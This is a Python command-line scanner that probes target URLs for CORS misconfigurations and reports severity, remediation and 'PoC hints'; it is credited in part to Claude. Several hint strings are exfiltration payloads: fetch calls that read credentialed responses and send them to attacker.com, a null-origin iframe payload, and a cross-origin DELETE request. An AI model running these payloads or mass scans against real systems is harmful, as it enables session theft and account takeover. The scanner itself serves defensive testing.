#!/usr/bin/env python3
"""
╔════════════════════════════════════════════════════════════════════════════╗
║           CORS MISCONFIGURATION SECURITY SCANNER (RED-TEAM)               ║
║           Fast · Modular · Professional · Exploitability-Focused          ║
╚════════════════════════════════════════════════════════════════════════════╝

Author  : Haileamlak & Claude (Red-Team Edition)
Version : 2.0.0
Purpose : Detect CORS misconfigurations with red-team exploitability focus
Usage   : python cors_scanner.py -u https://example.com
          python cors_scanner.py -f targets.txt --threads 20 --red-team
"""

import argparse
import concurrent.futures
import json
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Optional, List
from urllib.parse import urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[!] Missing dependency: pip install requests urllib3")
    sys.exit(1)

# ──────────────────────────────────────────────
#  ANSI Color Helpers
# ──────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def red(s):    return f"{C.RED}{s}{C.RESET}"
def green(s):  return f"{C.GREEN}{s}{C.RESET}"
def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
def bold(s):   return f"{C.BOLD}{s}{C.RESET}"
def dim(s):    return f"{C.DIM}{s}{C.RESET}"

# ──────────────────────────────────────────────
#  Data Models
# ──────────────────────────────────────────────
class Severity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH     = "HIGH"
    MEDIUM   = "MEDIUM"
    LOW      = "LOW"
    INFO     = "INFO"

class Exploitability(str, Enum):
    IMMEDIATE = "IMMEDIATE"      # Direct exploit path, no chaining needed
    PROBABLE  = "PROBABLE"       # High likelihood of exploitation
    CONDITIONAL = "CONDITIONAL" # Requires additional conditions
    THEORETICAL = "THEORETICAL" # Proof of concept only

SEVERITY_COLOR = {
    Severity.CRITICAL : C.RED + C.BOLD,
    Severity.HIGH     : C.RED,
    Severity.MEDIUM   : C.YELLOW,
    Severity.LOW      : C.CYAN,
    Severity.INFO     : C.WHITE,
}

EXPLOITABILITY_COLOR = {
    Exploitability.IMMEDIATE: C.RED + C.BOLD,
    Exploitability.PROBABLE: C.RED,
    Exploitability.CONDITIONAL: C.YELLOW,
    Exploitability.THEORETICAL: C.CYAN,
}

@dataclass
class Finding:
    check_id    : str
    check_name  : str
    severity    : Severity
    exploitability : Exploitability
    description : str
    evidence    : str
    impact      : str
    remediation : str
    poc_hint    : str
    url         : str

@dataclass
class ScanResult:
    url      : str
    findings : List[Finding] = field(default_factory=list)
    errors   : List[str]     = field(default_factory=list)
    duration : float         = 0.0

    @property
    def vulnerable(self) -> bool:
        return any(f.severity in (Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM)
                   for f in self.findings)

    @property
    def highest_severity(self) -> Optional[Severity]:
        order = [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]
        for sev in order:
            if any(f.severity == sev for f in self.findings):
                return sev
        return None

    @property
    def highest_exploitability(self) -> Optional[Exploitability]:
        order = [Exploitability.IMMEDIATE, Exploitability.PROBABLE,
                 Exploitability.CONDITIONAL, Exploitability.THEORETICAL]
        for exp in order:
            if any(f.exploitability == exp for f in self.findings):
                return exp
        return None

# ──────────────────────────────────────────────
#  HTTP Session Factory
# ──────────────────────────────────────────────
def make_session(timeout: int = 10, verify_ssl: bool = False) -> requests.Session:
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3,
                  status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (CORS-Scanner/2.0; Red-Team Security Research)",
        "Accept"    : "*/*",
    })
    session.verify  = verify_ssl
    session.timeout = timeout
    return session

# ──────────────────────────────────────────────
#  CORS Checks (Red-Team Focused)
# ──────────────────────────────────────────────
class CORSChecks:
    """All CORS misconfiguration detection logic with red-team exploitability focus."""

    @staticmethod
    def check_1_wildcard_origin(url: str, session: requests.Session) -> Optional[Finding]:
        try:
            r = session.get(url, headers={"Origin": "https://evil.com"})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            if acao == "*":
                return Finding(
                    check_id    = "CORS_001",
                    check_name  = "Wildcard Origin Allowed",
                    severity    = Severity.MEDIUM,
                    exploitability = Exploitability.PROBABLE,
                    description = "Server returns Access-Control-Allow-Origin: * allowing any origin to read response bodies.",
                    evidence    = f"Access-Control-Allow-Origin: {acao}",
                    impact      = "Any website can read response data if content is served without additional restrictions. Combined with auth tokens, this exposes user data.",
                    remediation = "Replace * with explicit origin whitelist: Access-Control-Allow-Origin: https://trusted.example.com",
                    poc_hint    = "fetch('https://target.com', {credentials: 'include'}).then(r => r.text()).then(console.log)",
                    url         = url,
                )
        except Exception:
            pass
        return None

    @staticmethod
    def check_2_reflected_origin(url: str, session: requests.Session) -> Optional[Finding]:
        evil = "https://evil-attacker.com"
        try:
            r = session.get(url, headers={"Origin": evil})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == evil:
                sev = Severity.CRITICAL if acac.lower() == "true" else Severity.HIGH
                exp = Exploitability.IMMEDIATE if acac.lower() == "true" else Exploitability.PROBABLE
                return Finding(
                    check_id    = "CORS_002",
                    check_name  = "Reflected Origin Allowed",
                    severity    = sev,
                    exploitability = exp,
                    description = (
                        "Server blindly reflects any supplied Origin header back in ACAO. "
                        + ("Combined with Allow-Credentials: true, this is an immediate account compromise." if acac.lower() == "true" else "")
                    ),
                    evidence    = f"Origin sent: {evil}\nAccess-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                    impact      = "Attacker can craft a website that, when visited by a target, steals their authenticated session data. Cookies and Authorization headers are accessible.",
                    remediation = "Validate Origin against a strict whitelist using exact string comparison (not regex). Never reflect arbitrary origins.",
                    poc_hint    = "Create attacker.com with: fetch('https://target.com/api', {credentials: 'include'}).then(r => r.json()).then(data => fetch('http://attacker.com/?data='+btoa(JSON.stringify(data))))",
                    url         = url,
                )
        except Exception:
            pass
        return None

    @staticmethod
    def check_3_null_origin(url: str, session: requests.Session) -> Optional[Finding]:
        try:
            r = session.get(url, headers={"Origin": "null"})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "null":
                sev = Severity.HIGH if acac.lower() == "true" else Severity.MEDIUM
                exp = Exploitability.PROBABLE if acac.lower() == "true" else Exploitability.CONDITIONAL
                return Finding(
                    check_id    = "CORS_003",
                    check_name  = "Null Origin Trusted",
                    severity    = sev,
                    exploitability = exp,
                    description = "Server trusts the 'null' origin, which can be spoofed via sandboxed iframes, data URIs, or file:// contexts.",
                    evidence    = f"Access-Control-Allow-Origin: {acao}",
                    impact      = "Attacker can use a sandboxed iframe or blob/data URI to send requests with Origin: null. If credentials are allowed, this leads to account compromise.",
                    remediation = "Never whitelist 'null' origin in production. Remove it entirely from your CORS policy.",
                    poc_hint    = "<iframe sandbox='allow-scripts allow-same-origin' src='data:text/html,<script>fetch(\"https://target.com/api\", {credentials: \"include\"}).then(r => r.json()).then(console.log)</script>'></iframe>",
                    url         = url,
                )
        except Exception:
            pass
        return None

    @staticmethod
    def check_4_credentials_crossorigin(url: str, session: requests.Session) -> Optional[Finding]:
        try:
            r = session.get(url, headers={"Origin": "https://attacker.com"})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acac.lower() == "true" and acao and acao != "*":
                if "attacker" in acao or acao == "https://attacker.com":
                    return Finding(
                        check_id    = "CORS_004",
                        check_name  = "Credentialed Cross-Origin Access",
                        severity    = Severity.CRITICAL,
                        exploitability = Exploitability.IMMEDIATE,
                        description = "Server allows credentials (cookies, Authorization header) to be sent to cross-origin requests.",
                        evidence    = f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                        impact      = "Browser will automatically send cookies and Authorization headers to this origin. Attacker reads all authenticated responses. Account takeover, data theft, privilege escalation.",
                        remediation = "Either: (1) Remove Allow-Credentials: true, or (2) Ensure ACAO is strict and not wildcard. Best practice: use SameSite=Strict cookies.",
                        poc_hint    = "fetch('https://target.com/api/user', {credentials: 'include', mode: 'cors'}).then(r => r.json()).then(user => fetch('http://attacker.com/log?user='+JSON.stringify(user)))",
                        url         = url,
                    )
        except Exception:
            pass
        return None

    @staticmethod
    def check_5_wildcard_credentials_conflict(url: str, session: requests.Session) -> Optional[Finding]:
        try:
            r = session.get(url, headers={"Origin": "https://evil.com"})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acac.lower() == "true" and acao == "*":
                return Finding(
                    check_id    = "CORS_005",
                    check_name  = "Wildcard + Credentials Conflict",
                    severity    = Severity.CRITICAL,
                    exploitability = Exploitability.IMMEDIATE,
                    description = "Dangerous invalid configuration: Allow-Credentials: true with wildcard origin. Browsers reject this, but indicates serious policy mistakes.",
                    evidence    = f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                    impact      = "Modern browsers may not enforce this strictly. Combined with other misconfigurations, this can lead to authentication bypass or data leakage. Indicates poor CORS understanding in the dev team.",
                    remediation = "This is an error. Remove * from ACAO and replace with specific allowed origins. Remove Allow-Credentials: true if not needed.",
                    poc_hint    = "Test in browser console; most browsers will reject due to invalid policy, but older or misconfigured browsers may allow it.",
                    url         = url,
                )
        except Exception:
            pass
        return None

    @staticmethod
    def check_6_subdomain_wildcard(url: str, session: requests.Session) -> Optional[Finding]:
        parsed = urlparse(url)
        parts  = parsed.netloc.split(".")
        root   = ".".join(parts[-2:]) if len(parts) >= 2 else parsed.netloc
        origin = f"https://xss.{root}"
        try:
            r = session.get(url, headers={"Origin": origin})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            if acao == origin:
                return Finding(
                    check_id    = "CORS_006",
                    check_name  = "Subdomain Wildcard Trust",
                    severity    = Severity.MEDIUM,
                    exploitability = Exploitability.CONDITIONAL,
                    description = f"Any subdomain of {root} is trusted. An XSS vulnerability on any subdomain leads to full CORS bypass.",
                    evidence    = f"Origin: {origin}\nAccess-Control-Allow-Origin: {acao}",
                    impact      = "If XSS exists on any subdomain, attacker can abuse CORS to read all authenticated API responses.",
                    remediation = "Whitelist only specific known subdomains. Avoid *.example.com patterns. Use CSP to prevent XSS.",
                    poc_hint    = "Combine with XSS on any subdomain; then use fetch() to read data from the main API via CORS.",
                    url         = url,
                )
        except Exception:
            pass
        return None

    @staticmethod
    def check_7_origin_bypass(url: str, session: requests.Session) -> List[Finding]:
        findings = []
        parsed = urlparse(url)
        base = parsed.netloc
        parts = base.split(".")
        root  = ".".join(parts[-2:]) if len(parts) >= 2 else base

        test_cases = [
            (f"https://evil{root}",         "Prefix bypass: evil prepended before domain"),
            (f"https://{root}.evil.com",     "Suffix bypass: target domain used as subdomain of attacker"),
            (f"https://{base}.evil.com",     "Full-host suffix bypass"),
            (f"https://evil.{root}",        "Subdomain injection on attacker domain"),
            (f"http://{root}",              "HTTP downgrade: protocol mismatch"),
            (f"http://{base}",              "HTTP downgrade on full host"),
            (f"https://{root}:80",          "Port manipulation: HTTPS with HTTP port"),
            (f"https://{root}:443",         "Port specification bypass"),
        ]

        for origin, reason in test_cases:
            try:
                r = session.get(url, headers={"Origin": origin})
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                if acao == origin:
                    findings.append(Finding(
                        check_id    = "CORS_007",
                        check_name  = "Origin Validation Bypass",
                        severity    = Severity.HIGH,
                        exploitability = Exploitability.PROBABLE,
                        description = f"Weak origin regex allows bypass: {reason}",
                        evidence    = f"Origin: {origin}\nAccess-Control-Allow-Origin: {acao}",
                        impact      = f"Attacker can use {origin} to bypass origin validation. If credentials are allowed, full account takeover.",
                        remediation = "Use exact-match string comparison (strcmp), not regex or substring matching, for origin validation. Whitelist only specific FQDNs.",
                        poc_hint    = f"fetch('https://target.com/api', {{credentials: 'include', headers: {{'Origin': '{origin}'}}}}).then(r => r.json()).then(console.log)",
                        url         = url,
                    ))
            except Exception:
                pass
        return findings

    @staticmethod
    def check_8_dangerous_methods(url: str, session: requests.Session) -> Optional[Finding]:
        try:
            r = session.options(url, headers={
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "PUT",
                "Access-Control-Request-Headers": "Authorization, Content-Type",
            })
            acam = r.headers.get("Access-Control-Allow-Methods", "")
            dangerous = [m for m in ["PUT", "DELETE", "PATCH", "TRACE"] if m in acam.upper()]
            if dangerous:
                return Finding(
                    check_id    = "CORS_008",
                    check_name  = "Dangerous Methods Allowed",
                    severity    = Severity.MEDIUM,
                    exploitability = Exploitability.PROBABLE,
                    description = f"Preflight response exposes dangerous HTTP methods: {', '.join(dangerous)}",
                    evidence    = f"Access-Control-Allow-Methods: {acam}",
                    impact      = f"Attacker can send {', '.join(dangerous)} requests from browser. Combine with reflected origin for account compromise, data modification, or deletion.",
                    remediation = "Restrict allowed methods to only GET, POST (or whatever is strictly required). Never expose PUT, DELETE, PATCH in CORS unless absolutely necessary.",
                    poc_hint    = f"fetch('https://target.com/api/users/123', {{method: 'DELETE', credentials: 'include', headers: {{'Origin': 'https://attacker.com'}}}}).then(r => alert('User deleted'))",
                    url         = url,
                )
        except Exception:
            pass
        return None

    @staticmethod
    def check_9_sensitive_headers(url: str, session: requests.Session) -> Optional[Finding]:
        try:
            r = session.get(url, headers={"Origin": "https://evil.com"})
            aceh = r.headers.get("Access-Control-Expose-Headers", "")
            sensitive = [h for h in ["Authorization", "Cookie", "X-Api-Key", "X-Auth-Token",
                                     "Set-Cookie", "WWW-Authenticate", "X-CSRF-Token"]
                         if h.lower() in aceh.lower()]
            if sensitive:
                return Finding(
                    check_id    = "CORS_009",
                    check_name  = "Sensitive Headers Exposed",
                    severity    = Severity.MEDIUM,
                    exploitability = Exploitability.PROBABLE,
                    description = f"Sensitive response headers are exposed to cross-origin scripts: {', '.join(sensitive)}",
                    evidence    = f"Access-Control-Expose-Headers: {aceh}",
                    impact      = "Cross-origin JavaScript can read sensitive headers directly from response. Combined with reflected origin, attacker steals tokens, API keys, or authentication cookies.",
                    remediation = "Only expose headers that are absolutely necessary and non-sensitive. Remove Authorization, Cookie, X-Api-Key, etc. from the list.",
                    poc_hint    = f"fetch('https://target.com/api', {{credentials: 'include'}}).then(r => console.log(r.headers.get('Authorization') || r.headers.get('X-Api-Key')))",
                    url         = url,
                )
        except Exception:
            pass
        return None

    @staticmethod
    def check_10_cache_poisoning(url: str, session: requests.Session) -> Optional[Finding]:
        try:
            r1 = session.get(url, headers={"Origin": "https://example.com"})
            r2 = session.get(url, headers={"Origin": "https://attacker.com"})
            acao1 = r1.headers.get("Access-Control-Allow-Origin", "")
            acao2 = r2.headers.get("Access-Control-Allow-Origin", "")
            vary = r1.headers.get("Vary", "")

            if acao1 and acao1 != acao2 and "origin" not in vary.lower():
                return Finding(
                    check_id    = "CORS_010",
                    check_name  = "Missing Vary: Origin / Cache Poisoning Risk",
                    severity    = Severity.LOW,
                    exploitability = Exploitability.CONDITIONAL,
                    description = "ACAO is dynamic (changes per request) but 'Vary: Origin' is missing. Risking cache poisoning attacks.",
                    evidence    = f"Request 1 Origin: example.com → ACAO: {acao1}\nRequest 2 Origin: attacker.com → ACAO: {acao2}\nVary: {vary or '(not set)'}",
                    impact      = "If cached by CDN/proxy without Vary: Origin, attacker's CORS response could be served to legitimate users. Can be chained with other CORS issues for widespread compromise.",
                    remediation = "Add 'Vary: Origin' header when serving dynamic ACAO values. Ensure CDN respects Vary header. Consider using Cache-Control: private for sensitive endpoints.",
                    poc_hint    = "Poison cache by requesting with Origin: attacker.com, then other users get attacker's ACAO response allowing their fetch() to send credentials.",
                    url         = url,
                )
        except Exception:
            pass
        return None

class CORSScanner:
    def __init__(self, timeout: int = 10, verify_ssl: bool = False, red_team: bool = False):
        self.timeout    = timeout
        self.verify_ssl = verify_ssl
        self.red_team   = red_team

    def scan(self, url: str) -> ScanResult:
        result  = ScanResult(url=url)
        start   = time.time()
        session = make_session(self.timeout, self.verify_ssl)
        checks  = CORSChecks()

        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            result.url = url

        single_checks = [
            checks.check_1_wildcard_origin,
            checks.check_2_reflected_origin,
            checks.check_3_null_origin,
            checks.check_4_credentials_crossorigin,
            checks.check_5_wildcard_credentials_conflict,
            checks.check_6_subdomain_wildcard,
            checks.check_8_dangerous_methods,
            checks.check_9_sensitive_headers,
            checks.check_10_cache_poisoning,
        ]

        for check in single_checks:
            try:
                finding = check(url, session)
                if finding:
                    result.findings.append(finding)
            except Exception as e:
                result.errors.append(f"{check.__name__}: {e}")

        try:
            for f in checks.check_7_origin_bypass(url, session):
                result.findings.append(f)
        except Exception as e:
            result.errors.append(f"check_7_origin_bypass: {e}")

        result.duration = round(time.time() - start, 2)
        session.close()
        return result

SEVERITY_ICON = {
    Severity.CRITICAL : "💀",
    Severity.HIGH     : "🔴",
    Severity.MEDIUM   : "🟡",
    Severity.LOW      : "🔵",
    Severity.INFO     : "ℹ️ ",
}

EXPLOITABILITY_ICON = {
    Exploitability.IMMEDIATE: "⚡",
    Exploitability.PROBABLE: "🎯",
    Exploitability.CONDITIONAL: "🔧",
    Exploitability.THEORETICAL: "🔬",
}

def print_banner():
    print(f"""
{C.CYAN}{C.BOLD}
  ██████╗ ██████╗ ██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
 ██╔════╝██╔═══██╗██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
 ██║     ██║   ██║██████╔╝███████╗    ███████╗██║     ███████║██╔██╗ ██║
 ██║     ██║   ██║██╔══██╗╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║
 ╚██████╗╚██████╔╝██║  ██║███████║    ███████║╚██████╗██║  ██║██║ ╚████║
  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{C.RESET}{C.DIM}  CORS Misconfiguration Security Scanner (Red-Team Edition)  v2.0.0{C.RESET}
""")

def severity_label(sev: Severity) -> str:
    col = SEVERITY_COLOR.get(sev, "")
    return f"{col}[{sev.value:8s}]{C.RESET}"

def exploitability_label(exp: Exploitability) -> str:
    col = EXPLOITABILITY_COLOR.get(exp, "")
    return f"{col}[{exp.value:11s}]{C.RESET}"

def print_result(result: ScanResult, verbose: bool = False, red_team: bool = False):
    hsev = result.highest_severity
    hexp = result.highest_exploitability
    col  = SEVERITY_COLOR.get(hsev, C.GREEN) if hsev else C.GREEN

    print(f"\n{bold('Target:')} {result.url}")
    print(f"{bold('Duration:')} {result.duration}s  |  "
          f"{bold('Findings:')} {len(result.findings)}  |  "
          f"{bold('Status:')} {col}{'VULNERABLE' if result.vulnerable else 'CLEAN'}{C.RESET}")

    if red_team and hexp:
        exp_col = EXPLOITABILITY_COLOR.get(hexp, "")
        print(f"{bold('Max Exploitability:')} {exp_col}{hexp.value}{C.RESET}")

    if not result.findings:
        print(f"  {green('No CORS issues detected.')}")

    for f in result.findings:
        icon = SEVERITY_ICON.get(f.severity, "•")
        print(f"\n  {icon} {severity_label(f.severity)}", end="")
        if red_team:
            exp_icon = EXPLOITABILITY_ICON.get(f.exploitability, "")
            print(f" {exploitability_label(f.exploitability)} {exp_icon}", end="")
        print(f" {bold(f.check_name)} ({f.check_id})")
        print(f"     {dim('Description :')} {f.description}")
        if verbose or red_team:
            for line in f.evidence.splitlines():
                print(f"     {dim('Evidence    :')} {cyan(line)}")
            print(f"     {dim('Impact      :')} {red(f.impact)}")
            print(f"     {dim('Remediation :')} {yellow(f.remediation)}")
            if red_team:
                print(f"     {dim('PoC Hint    :')} {cyan(f.poc_hint)}")

    if result.errors and verbose:
        print(f"\n  {yellow('Warnings/Errors:')}")
        for e in result.errors:
            print(f"    {dim('•')} {e}")

    print(f"  {'─'*80}")

def print_summary(results: List[ScanResult]):
    total      = len(results)
    vulnerable = sum(1 for r in results if r.vulnerable)
    clean      = total - vulnerable
    by_sev     = {s: 0 for s in Severity}
    by_exp     = {e: 0 for e in Exploitability}

    for r in results:
        for f in r.findings:
            by_sev[f.severity] += 1
            by_exp[f.exploitability] += 1

    print(f"\n{bold('═'*80)}")
    print(f"{bold('  SCAN SUMMARY')}")
    print(f"{bold('═'*80)}")
    print(f"  Targets scanned : {total}")
    print(f"  Vulnerable      : {red(str(vulnerable)) if vulnerable else green('0')}")
    print(f"  Clean           : {green(str(clean))}")
    print(f"\n  Findings by severity:")
    for sev in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]:
        count = by_sev[sev]
        col   = SEVERITY_COLOR.get(sev, "")
        bar   = "█" * min(count, 40)
        print(f"    {col}{sev.value:8s}{C.RESET}  {bar} {count}")

    print(f"\n  Findings by exploitability:")
    for exp in [Exploitability.IMMEDIATE, Exploitability.PROBABLE,
                Exploitability.CONDITIONAL, Exploitability.THEORETICAL]:
        count = by_exp[exp]
        col   = EXPLOITABILITY_COLOR.get(exp, "")
        bar   = "█" * min(count, 40)
        print(f"    {col}{exp.value:11s}{C.RESET}  {bar} {count}")

    print(f"{bold('═'*80)}\n")

def save_json_report(results: List[ScanResult], path: str, red_team: bool = False):
    data = {
        "generated_at": datetime.utcnow().isoformat() + "Z",
        "total_targets": len(results),
        "vulnerable_count": sum(1 for r in results if r.vulnerable),
        "red_team_mode": red_team,
        "results": [
            {
                "url"      : r.url,
                "vulnerable": r.vulnerable,
                "duration" : r.duration,
                "highest_severity": r.highest_severity.value if r.highest_severity else None,
                "highest_exploitability": r.highest_exploitability.value if r.highest_exploitability else None,
                "findings" : [
                    {
                        "check_id"     : f.check_id,
                        "check"        : f.check_name,
                        "severity"     : f.severity.value,
                        "exploitability": f.exploitability.value,
                        "description"  : f.description,
                        "evidence"     : f.evidence,
                        "impact"       : f.impact,
                        "remediation"  : f.remediation,
                        "poc_hint"     : f.poc_hint,
                    }
                    for f in r.findings
                ],
                "errors": r.errors,
            }
            for r in results
        ],
    }
    with open(path, "w") as fp:
        json.dump(data, fp, indent=2)
    print(f"{green('✔')} JSON report saved → {bold(path)}")

def save_text_report(results: List[ScanResult], path: str, red_team: bool = False):
    lines = []
    lines.append("CORS MISCONFIGURATION SCAN REPORT")
    if red_team:
        lines.append("(Red-Team Edition with Exploitability Focus)")
    lines.append(f"Generated: {datetime.utcnow().isoformat()}Z\n")
    for r in results:
        lines.append(f"URL: {r.url}")
        lines.append(f"Status: {'VULNERABLE' if r.vulnerable else 'CLEAN'}")
        lines.append(f"Duration: {r.duration}s")
        if red_team and r.highest_exploitability:
            lines.append(f"Max Exploitability: {r.highest_exploitability.value}")
        for f in r.findings:
            lines.append(f"\n  [{f.check_id}] [{f.severity.value}] {f.check_name}")
            lines.append(f"  Exploitability: {f.exploitability.value}")
            lines.append(f"  Description : {f.description}")
            lines.append(f"  Evidence    : {f.evidence}")
            lines.append(f"  Impact      : {f.impact}")
            lines.append(f"  Remediation : {f.remediation}")
            if red_team:
                lines.append(f"  PoC Hint    : {f.poc_hint}")
        lines.append("-" * 80)
    with open(path, "w") as fp:
        fp.write("\n".join(lines))
    print(f"{green('✔')} Text report saved → {bold(path)}")

def parse_args():
    parser = argparse.ArgumentParser(
        prog="cors_scanner",
        description="Professional CORS Misconfiguration Security Scanner (Red-Team Edition)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python cors_scanner.py -u https://api.example.com
  python cors_scanner.py -u https://example.com/api/v1/users --verbose --red-team
  python cors_scanner.py -f targets.txt --threads 20 --output report.json --red-team
  python cors_scanner.py -u https://example.com --timeout 15 --no-ssl-verify --red-team -v
        """,
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url",  help="Single target URL")
    group.add_argument("-f", "--file", help="File with one URL per line")

    parser.add_argument("--threads",       type=int,  default=10,   help="Concurrent threads (default: 10)")
    parser.add_argument("--timeout",       type=int,  default=10,   help="Request timeout in seconds (default: 10)")
    parser.add_argument("--no-ssl-verify", action="store_true",     help="Disable SSL certificate verification")
    parser.add_argument("--verbose","-v",  action="store_true",     help="Show detailed evidence and remediation")
    parser.add_argument("--red-team",      action="store_true",     help="Red-team mode: show exploitability and PoC hints")
    parser.add_argument("--output", "-o",                           help="Save JSON report to file")
    parser.add_argument("--output-txt",                             help="Save plain-text report to file")
    parser.add_argument("--quiet",  "-q",  action="store_true",     help="Only print vulnerable targets")
    return parser.parse_args()


def main():
    args = parse_args()
    print_banner()

    targets: List[str] = []
    if args.url:
        targets = [args.url.strip()]
    else:
        try:
            with open(args.file) as fp:
                targets = [line.strip() for line in fp if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            print(red(f"[!] File not found: {args.file}"))
            sys.exit(1)

    print(f"{bold('Targets  :')} {len(targets)}")
    print(f"{bold('Threads  :')} {args.threads}")
    print(f"{bold('Timeout  :')} {args.timeout}s")
    print(f"{bold('SSL Verify:')} {not args.no_ssl_verify}")
    print(f"{bold('Verbose  :')} {args.verbose}")
    print(f"{bold('Red-Team :')} {args.red_team}\n")
    print(f"{'─'*80}")

    scanner = CORSScanner(timeout=args.timeout, verify_ssl=not args.no_ssl_verify, red_team=args.red_team)
    results : List[ScanResult] = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as pool:
        future_to_url = {pool.submit(scanner.scan, t): t for t in targets}
        for future in concurrent.futures.as_completed(future_to_url):
            result = future.result()
            results.append(result)
            if args.quiet and not result.vulnerable:
                continue
            print_result(result, verbose=args.verbose, red_team=args.red_team)

    print_summary(results)

    if args.output:
        save_json_report(results, args.output, red_team=args.red_team)
    if args.output_txt:
        save_text_report(results, args.output_txt, red_team=args.red_team)

    sys.exit(1 if any(r.vulnerable for r in results) else 0)


if __name__ == "__main__":
    main()
